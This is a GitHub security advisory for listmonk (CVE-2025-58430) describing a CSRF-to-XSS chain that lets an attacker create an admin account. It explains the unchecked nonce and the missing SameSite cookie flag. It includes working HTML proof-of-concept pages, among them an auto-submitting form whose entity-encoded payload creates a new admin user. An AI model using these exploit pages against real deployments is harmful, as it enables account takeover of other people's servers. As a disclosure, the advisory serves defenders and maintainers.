# [H] listmonk: CSRF to XSS Chain can Lead to Admin Account Takeover

## Summary
Severity: High
Advisory: GHSA-rf24-wg77-gq7w
CVE: CVE-2025-58430
CWE: CWE-352, CWE-79, CWE-80
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2025-09-09
Source: https://github.com/advisories/GHSA-rf24-wg77-gq7w
Type: github-advisory

## Affected
- Go: `github.com/knadh/listmonk` — affected >=0

## Details
### Summary

Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker’s choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application.


### Details

During a security evaluation of the webapp, every http request in addition to the session cookie `session` there included `nonce`. The value is not checked and validated by the backend, removing `nonce` allows the requests to be processed correctly.

This may seem harmless, but if chained to other vulnerabilities it can become a critical vulnerability.

Example HTTP request without nonce : 
<img width="1418" height="772" alt="user_creation_without_nonce_burp_request" src="https://github.com/user-attachments/assets/a5026cdd-d360-4919-ae66-29856c3d3f32" />



### PoC

Let's look at a “chain” case of vulnerabilities that include the CSRF and XSS.

An admin (or any user with permissions) can create templates and preview them (`POST /api/templates/preview` ) making it possible to execute javascript code. For example:

<img width="1912" height="935" alt="browser_template_editor_with_alert" src="https://github.com/user-attachments/assets/a928a4bd-1e5f-4fbe-af08-196362e271ad" />

And this request can also be made without `nonce`.

<img width="1883" height="707" alt="template_preview_burp_request_without_nonce" src="https://github.com/user-attachments/assets/202c6a39-b62f-48c1-becb-688c3325dc41" />

Then an attacker can exploit this lack of validation to trigger an XSS in the victim's browser (let's assume the admin).

This is possible for 2 reasons :
 1) There is no validation of the `nonce` (as mentioned above)
 2) The `session` cookie has no samesite flag

<img width="1557" height="593" alt="no_same_site_response_cookie_burp" src="https://github.com/user-attachments/assets/c3fab6ac-5068-44cd-850a-bd095c10cb77" />

As we can see from the image above, no samesite cookie policy is set during login, so the browser will use the default one.
Some browsers by default set `Lax` (Chrome), but many others use `None` (Firefox, Edge).

For example, we can host this html page to prompt the admin to make a post request

```html
<html>
  <!-- CSRF PoC  -->
  <body>
    <form action="https://10.100.132.47/api/templates/preview" method="POST">
      <input type="hidden" name="template&#95;type" value="campaign" />
      <input type="hidden" name="body" value="&#123;&#123;&#32;template&#32;&quot;content&quot;&#32;&#46;&#32;&#125;&#125;&#13;&#10;&#13;&#10;&lt;script&gt;alert&#40;&#41;&lt;&#47;script&gt;" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>


```



The CSRF+XSS PoC written above has been tested on 3 browsers (using their latest versions)
- Chrome ❌
- Firefox ✅
- Edge ✅

Example in Firefox : 

![xss_mozilla_poc](https://github.com/user-attachments/assets/04397e79-0fa1-4c99-b8c2-5b2ff2fbf4fa)

We can now replace the simple `alert()` with any “harmful” request. For example, the creation of a new admin account:
<img width="1226" height="925" alt="browser_template_editor_with_final_payload" src="https://github.com/user-attachments/assets/a5a79c50-45f4-4a9c-80a5-683803349d1a" />

```html
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https:\/\/10.100.132.47\/api\/users", true);
        xhr.setRequestHeader("Content-Type", "application\/json");
        xhr.withCredentials = true;
        var body = "{\"username\":\"testuser4\",\"email\":\"test3@test.com\",\"name\":\"testuser4\",\"password\":\"Test12345\",\"passwordLogin\":true,\"type\":\"user\",\"status\":\"enabled\",\"listRoleId\":\"\",\"userRoleId\":1,\"password2\":\"Test12345\",\"password_login\":true,\"user_role_id\":1,\"list_role_id\":null}";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
      submitRequest();
    </script>
```

The final poc that exploits CSRF + XSS,  allowing admin account creation:

```html

<html>
  <!-- CSRF PoC -->
  <body>
    <form action="https://10.100.132.47/api/templates/preview" method="POST">
      <input type="hidden" name="template&#95;type" value="campaign" />
      <input type="hidden" name="body" value="&#123;&#123;&#32;template&#32;&quot;content&quot;&#32;&#46;&#32;&#125;&#125;&#13;&#10;&#13;&#10;&#32;&#32;&#32;&#32;&lt;script&gt;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;function&#32;submitRequest&#40;&#41;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#123;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;var&#32;xhr&#32;&#61;&#32;new&#32;XMLHttpRequest&#40;&#41;&#59;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;xhr&#46;open&#40;&quot;POST&quot;&#44;&#32;&quot;https&#58;&#92;&#47;&#92;&#47;10&#46;100&#46;132&#46;47&#92;&#47;api&#92;&#47;users&quot;&#44;&#32;true&#41;&#59;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;xhr&#46;setRequestHeader&#40;&quot;Content&#45;Type&quot;&#44;&#32;&quot;application&#92;&#47;json&quot;&#41;&#59;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;xhr&#46;withCredentials&#32;&#61;&#32;true&#59;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;var&#32;body&#32;&#61;&#32;&quot;&#123;&#92;&quot;username&#92;&quot;&#58;&#92;&quot;testuser4&#92;&quot;&#44;&#92;&quot;email&#92;&quot;&#58;&#92;&quot;test3&#64;test&#46;com&#92;&quot;&#44;&#92;&quot;name&#92;&quot;&#58;&#92;&quot;testuser4&#92;&quot;&#44;&#92;&quot;password&#92;&quot;&#58;&#92;&quot;Test12345&#92;&quot;&#44;&#92;&quot;passwordLogin&#92;&quot;&#58;true&#44;&#92;&quot;type&#92;&quot;&#58;&#92;&quot;user&#92;&quot;&#44;&#92;&quot;status&#92;&quot;&#58;&#92;&quot;enabled&#92;&quot;&#44;&#92;&quot;listRoleId&#92;&quot;&#58;&#92;&quot;&#92;&quot;&#44;&#92;&quot;userRoleId&#92;&quot;&#58;1&#44;&#92;&quot;password2&#92;&quot;&#58;&#92;&quot;Test12345&#92;&quot;&#44;&#92;&quot;password&#95;login&#92;&quot;&#58;true&#44;&#92;&quot;user&#95;role&#95;id&#92;&quot;&#58;1&#44;&#92;&quot;list&#95;role&#95;id&#92;&quot;&#58;null&#125;&quot;&#59;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;var&#32;aBody&#32;&#61;&#32;new&#32;Uint8Array&#40;body&#46;length&#41;&#59;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;for&#32;&#40;var&#32;i&#32;&#61;&#32;0&#59;&#32;i&#32;&lt;&#32;aBody&#46;length&#59;&#32;i&#43;&#43;&#41;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;aBody&#91;i&#93;&#32;&#61;&#32;body&#46;charCodeAt&#40;i&#41;&#59;&#32;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;xhr&#46;send&#40;new&#32;Blob&#40;&#91;aBody&#93;&#41;&#41;&#59;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#125;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;submitRequest&#40;&#41;&#59;&#13;&#10;&#32;&#32;&#32;&#32;&lt;&#47;script&gt;" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>


```

### Impact
Admin account creation

## References
- https://github.com/knadh/listmonk/security/advisories/GHSA-rf24-wg77-gq7w
- https://nvd.nist.gov/vuln/detail/CVE-2025-58430
- https://github.com/knadh/listmonk
